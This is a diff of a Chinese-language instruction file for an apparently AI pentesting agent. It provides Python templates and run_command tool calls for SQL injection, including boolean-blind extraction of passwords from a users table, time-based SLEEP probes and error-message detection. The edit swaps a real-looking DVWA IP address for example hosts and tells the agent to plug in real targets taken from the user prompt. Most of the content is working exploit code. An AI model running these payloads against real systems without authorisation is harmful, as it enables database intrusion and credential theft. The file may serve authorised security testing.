@@ -15,15 +15,17 @@ description: |
 调用形态：`run_command(command="python3 -c '<source>'")`。短脚本走 -c 内联，长脚本走 here-doc
 （`python3 <<'PY' ... PY`）。
 
+> **容器 host 改写**：脚本里 URL 如果指向宿主机本地服务（user prompt 里 host 是 `127.0.0.1` / `localhost` / 私网 IP），改写成 `host.docker.internal:<port>`；公网/内网域名原样保留。详见 `tooling/sqlmap` 手册。
+
 ## 核心模板（必会三种）
 
 ### 1. 单次请求 + 解析关键字段
 
 ```python
 import urllib.request as r, urllib.parse as p, json
-url = "http://x/api/q"
+url = "http://api.example.com/v1/query"
 body = p.urlencode({"id": "1' AND 1=1-- -"}).encode()
-req = r.Request(url, data=body, headers={"Cookie": "session=abc"})
+req = r.Request(url, data=body, headers={"Cookie": "session=<token>"})
 resp = r.urlopen(req, timeout=10)
 text = resp.read().decode("utf-8", errors="replace")
 print(f"status={resp.status} len={len(text)}")
@@ -44,8 +46,8 @@ PY
 ```python
 import urllib.request as r
 
-COOKIE = "PHPSESSID=abc; security=low"
-URL = "http://x/y?id=1' AND ASCII(SUBSTRING((SELECT password FROM users LIMIT 1),%d,1))%s%d-- -"
+COOKIE = "session=<token>"
+URL = "http://api.example.com/v1/products?id=1' AND ASCII(SUBSTRING((SELECT password FROM users LIMIT 1),%d,1))%s%d-- -"
 
 def query(payload):
     req = r.Request(payload, headers={"Cookie": COOKIE})
@@ -75,7 +77,7 @@ print("".join(char_at(i) for i in range(1, 16)))
 ```python
 import urllib.request as r, time
 
-COOKIE = "..."
+COOKIE = "session=<token>"
 def measure(payload_url):
     t0 = time.time()
     try:
@@ -84,8 +86,8 @@ def measure(payload_url):
         pass
     return time.time() - t0
 
-t = measure("http://x/y?id=1' AND IF(1=1, SLEEP(3), 0)-- -")
-f = measure("http://x/y?id=1' AND IF(1=2, SLEEP(3), 0)-- -")
+t = measure("http://api.example.com/v1/products?id=1' AND IF(1=1, SLEEP(3), 0)-- -")
+f = measure("http://api.example.com/v1/products?id=1' AND IF(1=2, SLEEP(3), 0)-- -")
 print(f"true={t:.2f} false={f:.2f}")  # true≈3.X false<1 → time-based 坐实
 ```
 
@@ -109,7 +111,7 @@ print(f"true={t:.2f} false={f:.2f}")  # true≈3.X false<1 → time-based 坐实
 
 ```python
 import urllib.request as r, json
-data = json.loads(r.urlopen("http://x/api").read())
+data = json.loads(r.urlopen("http://api.example.com/v1/api").read())
 print(data["error"]["message"][:200])
 ```
 
@@ -121,7 +123,7 @@ results = []
 def fetch(idx):
     t0 = time.time()
     try:
-        body = ur.urlopen(f"http://x/y?id={idx}", timeout=5).read()
+        body = ur.urlopen(f"http://api.example.com/v1/products?id={idx}", timeout=5).read()
         results.append((idx, len(body), round(time.time() - t0, 3)))
     except Exception as e:
         results.append((idx, -1, str(e)))
@@ -139,11 +141,11 @@ for r in sorted(results):
 import urllib.request as ur
 
 def probe(payload_value):
-    req = ur.Request("http://x/api/q",
+    req = ur.Request("http://api.example.com/v1/query",
                      data=payload_value.encode(),
                      headers={
                        "Content-Type": "application/json",
-                       "Cookie": "...",
+                       "Authorization": "Bearer <token>",
                        "X-Forwarded-For": "127.0.0.1",
                      },
                      method="POST")
@@ -152,11 +154,13 @@ def probe(payload_value):
 
 ## 实战示例
 
-### 示例 1：DVWA SQLi 长度差分确认
+> 示例里的 host/path/cookie 都是占位；按 user prompt 里抓到的真实值套用。
+
+### 示例 1：长度差分确认（布尔盲注）
 
 ```
 run_command({
-  "command": "python3 <<'PY'\nimport urllib.request as r\nC = {'Cookie': 'PHPSESSID=abc; security=low'}\nT = len(r.urlopen(r.Request(\"http://49.234.23.42:8888/vulnerabilities/sqli/?id=1'+AND+1%3D1--+\", headers=C)).read())\nF = len(r.urlopen(r.Request(\"http://49.234.23.42:8888/vulnerabilities/sqli/?id=1'+AND+1%3D2--+\", headers=C)).read())\nprint(f'true_len={T} false_len={F} diff={abs(T-F)}')\nPY",
+  "command": "python3 <<'PY'\nimport urllib.request as r\nC = {'Cookie': 'session=<token>'}\nT = len(r.urlopen(r.Request(\"http://api.example.com/v1/products?id=1'+AND+1%3D1--+\", headers=C)).read())\nF = len(r.urlopen(r.Request(\"http://api.example.com/v1/products?id=1'+AND+1%3D2--+\", headers=C)).read())\nprint(f'true_len={T} false_len={F} diff={abs(T-F)}')\nPY",
   "tag": "py3-bool-len",
   "timeout_seconds": 60
 })
@@ -166,7 +170,7 @@ run_command({
 
 ```
 run_command({
-  "command": "python3 <<'PY'\nimport urllib.request as r, time\nC = {'Cookie': '...'}\ndef m(u):\n    t0 = time.time()\n    try: r.urlopen(r.Request(u, headers=C), timeout=15).read()\n    except: pass\n    return time.time() - t0\nt = m(\"http://x/y?id=1'+AND+IF(1%3D1,SLEEP(3),0)--+\")\nf = m(\"http://x/y?id=1'+AND+IF(1%3D2,SLEEP(3),0)--+\")\nprint(f'true={t:.2f} false={f:.2f}')\nPY",
+  "command": "python3 <<'PY'\nimport urllib.request as r, time\nC = {'Cookie': 'session=<token>'}\ndef m(u):\n    t0 = time.time()\n    try: r.urlopen(r.Request(u, headers=C), timeout=15).read()\n    except: pass\n    return time.time() - t0\nt = m(\"http://api.example.com/v1/products?id=1'+AND+IF(1%3D1,SLEEP(3),0)--+\")\nf = m(\"http://api.example.com/v1/products?id=1'+AND+IF(1%3D2,SLEEP(3),0)--+\")\nprint(f'true={t:.2f} false={f:.2f}')\nPY",
   "tag": "py3-time-blind",
   "timeout_seconds": 90
 })
@@ -176,7 +180,7 @@ run_command({
 
 ```
 run_command({
-  "command": "python3 <<'PY'\nimport urllib.request as r, re\nbody = r.urlopen('http://x/y?id=1%27').read().decode(errors='replace')\nm = re.search(r'(SQLException|sql syntax|pg_query|ORA-\\d+).{0,200}', body, re.IGNORECASE)\nprint('hit:' + m.group(0)[:200] if m else 'miss')\nPY",
+  "command": "python3 <<'PY'\nimport urllib.request as r, re\nbody = r.urlopen('http://api.example.com/v1/products?id=1%27').read().decode(errors='replace')\nm = re.search(r'(SQLException|sql syntax|pg_query|ORA-\\d+).{0,200}', body, re.IGNORECASE)\nprint('hit:' + m.group(0)[:200] if m else 'miss')\nPY",
   "tag": "py3-regex"
 })
 ```
